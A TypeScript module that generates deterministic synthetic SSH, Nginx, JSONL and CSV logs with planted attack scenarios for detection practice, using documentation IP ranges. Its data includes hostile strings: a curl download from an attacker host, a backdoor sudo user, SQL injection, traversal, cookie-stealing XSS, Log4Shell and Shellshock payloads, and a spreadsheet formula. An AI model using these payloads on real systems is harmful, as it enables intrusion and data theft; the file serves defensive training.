import type { LogFormat } from '../../types/events';
import type { FieldMapping } from '../../types/ingestion';

/**
 * Deterministic synthetic sample logs. Every address is from the IETF
 * documentation ranges (RFC 5737: 192.0.2.0/24, 198.51.100.0/24,
 * 203.0.113.0/24), so no real host is referenced. The same seed always
 * produces the same file, so documented sample results are reproducible.
 */

export type SampleId = 'ssh-auth' | 'nginx-access' | 'jsonl-auth' | 'csv-web';

export interface SampleInfo {
  id: SampleId;
  name: string;
  format: LogFormat;
  description: string;
  fileName: string;
  /** Scenarios planted in the data, shown so analysts know what to look for. */
  scenarios: string[];
  mapping?: FieldMapping;
}

export const SAMPLE_YEAR = 2026;
const BASE = Date.UTC(SAMPLE_YEAR, 9, 26, 0, 0, 0);
const SEC = 1000;
const MIN = 60 * SEC;
const HOUR = 60 * MIN;

export const SAMPLES: SampleInfo[] = [
  {
    id: 'ssh-auth',
    name: 'Linux SSH auth log',
    format: 'linux-auth',
    fileName: 'sample-auth.log',
    description:
      '24 hours of a bastion host auth.log: normal key-based logins, sudo and cron activity.',
    scenarios: [
      'Brute force against root from 203.0.113.50, ending in a successful password login as "deploy" followed by suspicious sudo use and a new user',
      'Password spraying across ~24 accounts from 203.0.113.77',
      'Distributed guessing from eight 192.0.2.x addresses',
      'A few malformed lines and "message repeated" records',
    ],
  },
  {
    id: 'nginx-access',
    name: 'Nginx access log',
    format: 'nginx',
    fileName: 'sample-nginx-access.log',
    description: '24 hours of web traffic for a small shop in Nginx combined format.',
    scenarios: [
      'Content discovery from 203.0.113.9 that finds an exposed /.env file',
      'SQL injection, traversal and Log4Shell-style probes from 198.51.100.66',
      'Credential guessing against POST /login from 192.0.2.150',
      'An upstream outage producing a burst of 502/503 responses',
      'An aggressive crawler from 198.51.100.200',
    ],
  },
  {
    id: 'jsonl-auth',
    name: 'Identity provider JSONL',
    format: 'jsonl',
    fileName: 'sample-idp-auth.jsonl',
    description:
      '12 hours of ECS-style login events from a VPN / identity provider, one JSON object per line.',
    scenarios: [
      'Distributed password guessing across many accounts',
      'A successful login for j.smith after repeated failures from 203.0.113.120',
      'Two truncated JSON lines',
    ],
    mapping: {
      timestamp: '@timestamp',
      action: 'event.action',
      outcome: 'event.outcome',
      sourceIp: 'source.ip',
      username: 'user.name',
      userAgent: 'user_agent.original',
      host: 'host.name',
    },
  },
  {
    id: 'csv-web',
    name: 'Web requests CSV',
    format: 'csv',
    fileName: 'sample-web-requests.csv',
    description: '6 hours of web requests exported from a reverse proxy as CSV with a header row.',
    scenarios: [
      'Path probing with sqlmap from 203.0.113.33',
      'A formula-like user agent to demonstrate safe CSV export',
    ],
    mapping: {
      timestamp: 'timestamp',
      sourceIp: 'src_ip',
      httpMethod: 'method',
      path: 'url',
      statusCode: 'status',
      userAgent: 'user_agent',
    },
  },
];

export function mulberry32(seed: number): () => number {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

interface Line {
  t: number;
  text: string;
}

class Builder {
  readonly lines: Line[] = [];
  constructor(readonly rnd: () => number) {}
  int(min: number, max: number): number {
    return min + Math.floor(this.rnd() * (max - min + 1));
  }
  pick<T>(items: readonly T[]): T {
    return items[Math.floor(this.rnd() * items.length)]!;
  }
  add(t: number, text: string): void {
    this.lines.push({ t, text });
  }
  render(): string {
    return `${this.lines
      .map((l, i) => ({ ...l, i }))
      .sort((a, b) => a.t - b.t || a.i - b.i)
      .map((l) => l.text)
      .join('\n')}\n`;
  }
}

const MONTHS = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
const pad = (n: number): string => String(n).padStart(2, '0');

function syslogTime(t: number): string {
  const d = new Date(t);
  return `${MONTHS[d.getUTCMonth()]} ${String(d.getUTCDate()).padStart(2, ' ')} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())}`;
}

function clfTime(t: number): string {
  const d = new Date(t);
  return `${pad(d.getUTCDate())}/${MONTHS[d.getUTCMonth()]}/${d.getUTCFullYear()}:${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())} +0000`;
}

function generateSsh(): string {
  const b = new Builder(mulberry32(20261026));
  const host = 'bastion-01';
  let pid = 4000;
  const sshd = (t: number, msg: string, p = pid): void =>
    b.add(t, `${syslogTime(t)} ${host} sshd[${p}]: ${msg}`);
  const staff = [
    { user: 'alice', ip: '198.51.100.10' },
    { user: 'bob', ip: '198.51.100.11' },
    { user: 'carol', ip: '198.51.100.12' },
    { user: 'deploy', ip: '198.51.100.14' },
    { user: 'backup', ip: '198.51.100.15' },
  ];

  // Normal logins throughout the day.
  for (let t = BASE + 7 * MIN; t < BASE + 24 * HOUR; t += b.int(8, 22) * MIN) {
    const s = b.pick(staff);
    pid++;
    const port = b.int(40000, 60999);
    if (b.rnd() < 0.08)
      sshd(t - 9 * SEC, `Failed password for ${s.user} from ${s.ip} port ${port} ssh2`);
    const method = s.user === 'backup' || b.rnd() < 0.7 ? 'publickey' : 'password';
    sshd(
      t,
      `Accepted ${method} for ${s.user} from ${s.ip} port ${port} ssh2${method === 'publickey' ? ': ED25519 SHA256:Zm9vYmFyYmF6' : ''}`,
    );
    sshd(
      t,
      `pam_unix(sshd:session): session opened for user ${s.user}(uid=${1000 + staff.indexOf(s)}) by (uid=0)`,
    );
    b.add(
      t + SEC,
      `${syslogTime(t + SEC)} ${host} systemd-logind[612]: New session ${pid} of user ${s.user}.`,
    );
    if ((s.user === 'alice' || s.user === 'bob') && b.rnd() < 0.4) {
      const cmd = b.pick([
        '/usr/bin/systemctl restart nginx',
        '/usr/bin/journalctl -u nginx',
        '/usr/bin/apt update',
        '/usr/bin/tail -f /var/log/syslog',
      ]);
      const st = t + b.int(30, 300) * SEC;
      b.add(
        st,
        `${syslogTime(st)} ${host} sudo:    ${s.user} : TTY=pts/${b.int(0, 4)} ; PWD=/home/${s.user} ; USER=root ; COMMAND=${cmd}`,
      );
    }
    const end = t + b.int(2, 40) * MIN;
    sshd(end, `Received disconnect from ${s.ip} port ${port}:11: disconnected by user`);
    sshd(end, `pam_unix(sshd:session): session closed for user ${s.user}`);
  }

  // Cron every hour.
  for (let h = 0; h < 24; h++) {
    const t = BASE + h * HOUR + 17 * MIN;
    const p = 9000 + h;
    b.add(
      t,
      `${syslogTime(t)} ${host} CRON[${p}]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)`,
    );
    b.add(
      t + 2 * SEC,
      `${syslogTime(t + 2 * SEC)} ${host} CRON[${p}]: pam_unix(cron:session): session closed for user root`,
    );
  }

  // Internet background noise.
  for (let t = BASE + 3 * MIN; t < BASE + 24 * HOUR; t += b.int(20, 70) * MIN) {
    const ip = `192.0.2.${b.int(160, 240)}`;
    pid++;
    if (b.rnd() < 0.5) sshd(t, `Connection closed by ${ip} port ${b.int(30000, 65000)} [preauth]`);
    else sshd(t, `Did not receive identification string from ${ip} port ${b.int(30000, 65000)}`);
  }

  // Scenario 1: brute force from 203.0.113.50 → compromise of "deploy".
  const attacker = '203.0.113.50';
  let t = BASE + 3 * HOUR + 12 * MIN;
  for (let i = 0; i < 170; i++) {
    pid++;
    t += b.int(2, 5) * SEC;
    sshd(t, `Failed password for root from ${attacker} port ${b.int(40000, 60000)} ssh2`);
    if (i % 40 === 39) {
      t += SEC;
      sshd(
        t,
        `message repeated 3 times: [ Failed password for root from ${attacker} port ${b.int(40000, 60000)} ssh2]`,
      );
    }
  }
  for (const user of ['admin', 'test', 'ubuntu', 'oracle', 'pi', 'guest', 'ftpuser']) {
    for (let i = 0; i < 3; i++) {
      pid++;
      t += b.int(2, 4) * SEC;
      const port = b.int(40000, 60000);
      sshd(t, `Invalid user ${user} from ${attacker} port ${port}`);
      sshd(t + SEC, `Failed password for invalid user ${user} from ${attacker} port ${port} ssh2`);
    }
  }
  for (let i = 0; i < 12; i++) {
    pid++;
    t += b.int(3, 6) * SEC;
    sshd(t, `Failed password for deploy from ${attacker} port ${b.int(40000, 60000)} ssh2`);
  }
  t += 7 * SEC;
  pid++;
  const compromisePid = pid;
  sshd(t, `Accepted password for deploy from ${attacker} port 51234 ssh2`, compromisePid);
  sshd(
    t,
    `pam_unix(sshd:session): session opened for user deploy(uid=1003) by (uid=0)`,
    compromisePid,
  );
  b.add(
    t + 2 * MIN,
    `${syslogTime(t + 2 * MIN)} ${host} sudo:   deploy : TTY=pts/3 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -fsSL http://203.0.113.50/update.sh -o /tmp/u.sh`,
  );
  b.add(
    t + 3 * MIN,
    `${syslogTime(t + 3 * MIN)} ${host} sudo:   deploy : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash sysupdate`,
  );
  b.add(
    t + 3 * MIN + SEC,
    `${syslogTime(t + 3 * MIN + SEC)} ${host} useradd[7777]: new user: name=sysupdate, UID=1010, GID=1010, home=/home/sysupdate, shell=/bin/bash, from=/dev/pts/3`,
  );
  b.add(
    t + 4 * MIN,
    `${syslogTime(t + 4 * MIN)} ${host} usermod[7790]: add 'sysupdate' to group 'sudo'`,
  );
  sshd(t + 9 * MIN, `pam_unix(sshd:session): session closed for user deploy`, compromisePid);

  // Scenario 2: password spraying from 203.0.113.77.
  const sprayer = '203.0.113.77';
  const accounts = [
    'alice',
    'bob',
    'carol',
    'dave',
    'erin',
    'frank',
    'grace',
    'heidi',
    'ivan',
    'judy',
    'mallory',
    'niaj',
    'olivia',
    'peggy',
    'rupert',
    'sybil',
    'trent',
    'victor',
    'walter',
    'deploy',
    'backup',
    'jenkins',
    'git',
    'postgres',
  ];
  t = BASE + 14 * HOUR + 5 * MIN;
  const realUsers = new Set(['alice', 'bob', 'carol', 'deploy', 'backup']);
  for (const user of accounts) {
    for (let i = 0; i < (b.rnd() < 0.3 ? 2 : 1); i++) {
      pid++;
      t += b.int(15, 40) * SEC;
      const port = b.int(40000, 60000);
      if (realUsers.has(user))
        sshd(t, `Failed password for ${user} from ${sprayer} port ${port} ssh2`);
      else {
        sshd(t, `Invalid user ${user} from ${sprayer} port ${port}`);
        sshd(t + SEC, `Failed password for invalid user ${user} from ${sprayer} port ${port} ssh2`);
      }
    }
  }

  // Scenario 3: distributed guessing from several addresses.
  const targets = [
    'admin',
    'root',
    'support',
    'sales',
    'hr',
    'it',
    'web',
    'mysql',
    'nagios',
    'tomcat',
    'user',
    'student',
    'office',
    'ec2-user',
  ];
  t = BASE + 19 * HOUR;
  for (let n = 0; n < 8; n++) {
    const ip = `192.0.2.${21 + n * 7}`;
    for (let i = 0; i < 3; i++) {
      pid++;
      t += b.int(20, 60) * SEC;
      sshd(
        t,
        `Failed password for ${targets[(n * 3 + i) % targets.length]} from ${ip} port ${b.int(40000, 60000)} ssh2`,
      );
    }
  }

  // Malformed records: truncated and non-syslog lines.
  b.add(BASE + 11 * HOUR + 2 * MIN, 'Oct 26 11:02');
  b.add(BASE + 11 * HOUR + 3 * MIN, '#### logrotate: rotated auth.log ####');
  b.add(
    BASE + 15 * HOUR,
    `${syslogTime(BASE + 15 * HOUR)} ${host} sshd[5555]: Failed password for root from bad-host.example.test port 2222 ssh2`,
  );
  return b.render();
}

function generateNginx(): string {
  const b = new Builder(mulberry32(42));
  const line = (
    t: number,
    ip: string,
    method: string,
    path: string,
    status: number,
    bytes: number,
    ua: string,
    ref = '-',
  ): void =>
    b.add(
      t,
      `${ip} - - [${clfTime(t)}] "${method} ${path} HTTP/1.1" ${status} ${bytes} "${ref}" "${ua}"`,
    );
  const browsers = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
  ];
  const clients = Array.from({ length: 36 }, (_, i) =>
    i < 18 ? `198.51.100.${30 + i}` : `192.0.2.${40 + i}`,
  );
  const pages = [
    '/',
    '/index.html',
    '/products',
    '/products/1001',
    '/products/1002',
    '/products/1017',
    '/about',
    '/contact',
    '/cart',
    '/blog/winter-sale',
  ];
  const assets = ['/static/app.js', '/static/style.css', '/static/logo.svg', '/favicon.ico'];

  for (let t = BASE; t < BASE + 24 * HOUR; t += b.int(10, 45) * SEC) {
    const ip = b.pick(clients);
    const ua = browsers[clients.indexOf(ip) % browsers.length]!;
    const page = b.pick(pages);
    line(t, ip, 'GET', page, b.rnd() < 0.15 ? 304 : 200, b.int(2000, 40000), ua);
    for (const asset of assets) {
      if (b.rnd() < 0.5) {
        const st = asset === '/favicon.ico' && b.rnd() < 0.3 ? 404 : b.rnd() < 0.6 ? 304 : 200;
        line(
          t + b.int(1, 3) * SEC,
          ip,
          'GET',
          asset,
          st,
          st === 200 ? b.int(500, 90000) : 0,
          ua,
          `https://shop.example.test${page}`,
        );
      }
    }
    if (b.rnd() < 0.05) {
      line(t + 5 * SEC, ip, 'GET', '/login', 200, 3100, ua);
      line(t + 20 * SEC, ip, 'POST', '/login', b.rnd() < 0.85 ? 302 : 401, 312, ua);
    }
    if (b.rnd() < 0.08) line(t + 8 * SEC, ip, 'POST', '/api/cart', 200, 98, ua);
    if (b.rnd() < 0.004) line(t + 9 * SEC, ip, 'GET', '/api/checkout', 500, 0, ua);
  }

  // Scenario: content discovery from 203.0.113.9 finding /.env.
  const scanner = '203.0.113.9';
  const words = [
    'admin',
    'backup',
    'old',
    'test',
    'dev',
    'tmp',
    'uploads',
    'cgi-bin',
    'private',
    'logs',
    'db',
    'sql',
    'shell',
    'cms',
    'portal',
    'staging',
    'beta',
    'api/v1/debug',
    'console',
    'manager/html',
    'phpinfo.php',
    'info.php',
    'server-status',
    'actuator/env',
    '.git/config',
    '.git/HEAD',
    '.svn/entries',
    '.DS_Store',
    'config.php',
    'wp-config.php.bak',
    'backup.sql',
    'db.sql',
    'site.tar.gz',
    'wp-login.php',
    'wp-admin/',
    'phpmyadmin/',
    'pma/',
    'xmlrpc.php',
    '.htaccess',
    '.htpasswd',
  ];
  let t = BASE + 2 * HOUR + 15 * MIN;
  for (const w of words) {
    t += b.int(1, 4) * SEC;
    line(t, scanner, 'GET', `/${w}`, w === 'admin' ? 403 : 404, 153, 'Mozilla/5.0 zgrab/0.x');
  }
  for (let i = 0; i < 60; i++) {
    t += b.int(1, 2) * SEC;
    line(
      t,
      scanner,
      'GET',
      `/${['secret', 'files', 'data', 'export', 'archive', 'media'][i % 6]}${i}/`,
      404,
      153,
      'Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000123)',
    );
  }
  t += 2 * SEC;
  line(t, scanner, 'GET', '/.env', 200, 1532, 'Mozilla/5.0 zgrab/0.x');
  t += 2 * SEC;
  line(t, scanner, 'TRACE', '/', 405, 0, 'Mozilla/5.0 zgrab/0.x');
  line(t + SEC, scanner, 'PROPFIND', '/', 405, 0, 'Mozilla/5.0 zgrab/0.x');
  b.add(
    t + 3 * SEC,
    `192.0.2.99 - - [${clfTime(t + 3 * SEC)}] "\\x16\\x03\\x01\\x00\\xf4\\x01\\x00\\x00\\xf0\\x03\\x03" 400 157 "-" "-"`,
  );

  // Scenario: injection probes from 198.51.100.66.
  const prober = '198.51.100.66';
  t = BASE + 9 * HOUR + 40 * MIN;
  const probes: Array<[string, number, string]> = [
    ["/products?id=1'%20OR%20'1'='1", 500, 'sqlmap/1.8.4#stable (https://sqlmap.org)'],
    [
      '/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--',
      500,
      'sqlmap/1.8.4#stable (https://sqlmap.org)',
    ],
    ['/products?id=1%20AND%20SLEEP(5)', 200, 'sqlmap/1.8.4#stable (https://sqlmap.org)'],
    ['/static/..%2f..%2f..%2f..%2fetc/passwd', 400, 'Mozilla/5.0'],
    ['/download?file=../../../../etc/passwd', 404, 'Mozilla/5.0'],
    ['/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E', 200, 'Mozilla/5.0'],
    ['/', 200, '${jndi:ldap://203.0.113.66:1389/Exploit}'],
    ['/cgi-bin/status', 404, '() { :; }; /bin/bash -c "id"'],
    ['/index.php?page=php://filter/convert.base64-encode/resource=index', 404, 'Mozilla/5.0'],
  ];
  for (const [path, status, ua] of probes) {
    t += b.int(5, 20) * SEC;
    line(t, prober, 'GET', path, status, status === 200 ? 4200 : 0, ua);
  }

  // Scenario: credential guessing against /login.
  const guesser = '192.0.2.150';
  t = BASE + 11 * HOUR;
  for (let i = 0; i < 60; i++) {
    t += b.int(2, 5) * SEC;
    line(t, guesser, 'POST', '/login', 401, 312, 'python-requests/2.32.3');
  }
  line(t + 3 * SEC, guesser, 'POST', '/login', 302, 0, 'python-requests/2.32.3');

  // Scenario: upstream outage.
  t = BASE + 16 * HOUR + 30 * MIN;
  for (let i = 0; i < 45; i++) {
    t += b.int(2, 5) * SEC;
    const ip = b.pick(clients);
    line(
      t,
      ip,
      'GET',
      b.pick(pages),
      b.rnd() < 0.6 ? 502 : 503,
      157,
      browsers[clients.indexOf(ip) % browsers.length]!,
    );
  }

  // Scenario: aggressive crawler.
  t = BASE + 21 * HOUR;
  for (let i = 0; i < 420; i++) {
    t += 130;
    line(
      t,
      '198.51.100.200',
      'GET',
      `/products/${1000 + (i % 180)}`,
      b.rnd() < 0.9 ? 200 : 404,
      b.int(2000, 30000),
      'ExampleBot/1.0 (+https://bot.example.test)',
    );
  }
  b.add(BASE + 12 * HOUR, 'nginx: [warn] upstream response buffered to a temporary file');
  return b.render();
}

function generateJsonl(): string {
  const b = new Builder(mulberry32(7));
  const rec = (
    t: number,
    user: string,
    ip: string,
    outcome: 'success' | 'failure',
    ua: string,
  ): void =>
    b.add(
      t,
      JSON.stringify({
        '@timestamp': new Date(t).toISOString(),
        event: { action: 'user_login', category: 'authentication', outcome },
        source: { ip },
        user: { name: user },
        user_agent: { original: ua },
        host: { name: 'idp-01' },
        service: 'vpn',
      }),
    );
  const users = [
    'a.jones',
    'b.patel',
    'c.nguyen',
    'd.garcia',
    'e.kim',
    'f.muller',
    'g.rossi',
    'h.silva',
    'i.ivanova',
    'j.smith',
    'k.tanaka',
    'l.okafor',
  ];
  const start = BASE + 6 * HOUR;
  for (let t = start; t < start + 12 * HOUR; t += b.int(1, 4) * MIN) {
    const i = b.int(0, users.length - 1);
    const ip = `198.51.100.${100 + i}`;
    if (b.rnd() < 0.06) rec(t - 20 * SEC, users[i]!, ip, 'failure', 'GlobalProtect/6.2');
    rec(t, users[i]!, ip, 'success', 'GlobalProtect/6.2');
    if (b.rnd() < 0.3) {
      b.add(
        t + 30 * MIN,
        JSON.stringify({
          '@timestamp': new Date(t + 30 * MIN).toISOString(),
          event: { action: 'user_logout', outcome: 'success' },
          user: { name: users[i] },
          source: { ip },
          service: 'vpn',
        }),
      );
    }
  }
  // Distributed guessing across many accounts.
  let t = start + 3 * HOUR;
  for (let n = 0; n < 30; n++) {
    t += b.int(10, 40) * SEC;
    rec(
      t,
      users[n % users.length]!,
      `192.0.2.${70 + (n % 6)}`,
      'failure',
      'python-requests/2.32.3',
    );
  }
  // Success after failures for j.smith.
  t = start + 7 * HOUR;
  for (let i = 0; i < 6; i++) {
    t += b.int(20, 50) * SEC;
    rec(t, 'j.smith', '203.0.113.120', 'failure', 'Mozilla/5.0');
  }
  rec(t + 40 * SEC, 'j.smith', '203.0.113.120', 'success', 'Mozilla/5.0');
  b.add(
    start + 2 * HOUR,
    '{"@timestamp":"2026-10-26T08:00:00Z","event":{"action":"user_login","outcome":"fail',
  );
  b.add(start + 9 * HOUR, '{"@timestamp":"2026-10-26T15:00:00Z","event":');
  return b.render();
}

function generateCsv(): string {
  const b = new Builder(mulberry32(99));
  const row = (
    t: number,
    ip: string,
    method: string,
    url: string,
    status: number,
    bytes: number,
    ua: string,
  ): void => {
    const quote = (v: string): string => (/[",\n]/.test(v) ? `"${v.replace(/"/g, '""')}"` : v);
    b.add(
      t,
      [new Date(t).toISOString(), ip, method, quote(url), status, bytes, quote(ua)].join(','),
    );
  };
  const start = BASE + 8 * HOUR;
  for (let t = start; t < start + 6 * HOUR; t += b.int(20, 60) * SEC) {
    const ip = `198.51.100.${b.int(50, 70)}`;
    row(
      t,
      ip,
      b.rnd() < 0.85 ? 'GET' : 'POST',
      b.pick(['/', '/api/items', '/api/items/17', '/login', '/static/main.js']),
      b.rnd() < 0.95 ? 200 : 404,
      b.int(100, 9000),
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    );
  }
  let t = start + 2 * HOUR;
  for (let i = 0; i < 40; i++) {
    t += 2 * SEC;
    row(
      t,
      '203.0.113.33',
      'GET',
      `/api/items?id=${i}' OR 1=1--`,
      i % 5 === 0 ? 500 : 404,
      0,
      'sqlmap/1.8.4#stable (https://sqlmap.org)',
    );
  }
  for (let i = 0; i < 25; i++) {
    t += SEC;
    row(
      t,
      '203.0.113.33',
      'GET',
      `/hidden${i}/`,
      404,
      0,
      'sqlmap/1.8.4#stable (https://sqlmap.org)',
    );
  }
  row(
    start + 4 * HOUR,
    '192.0.2.44',
    'GET',
    '/',
    200,
    512,
    '=HYPERLINK("https://example.test","click")',
  );
  return `timestamp,src_ip,method,url,status,bytes,user_agent\n${b.render()}`;
}

const GENERATORS: Record<SampleId, () => string> = {
  'ssh-auth': generateSsh,
  'nginx-access': generateNginx,
  'jsonl-auth': generateJsonl,
  'csv-web': generateCsv,
};

export function isSampleId(value: unknown): value is SampleId {
  return typeof value === 'string' && Object.prototype.hasOwnProperty.call(GENERATORS, value);
}

export function generateSample(id: SampleId): string {
  return GENERATORS[id]();
}

export function sampleInfo(id: SampleId): SampleInfo {
  return SAMPLES.find((s) => s.id === id)!;
}
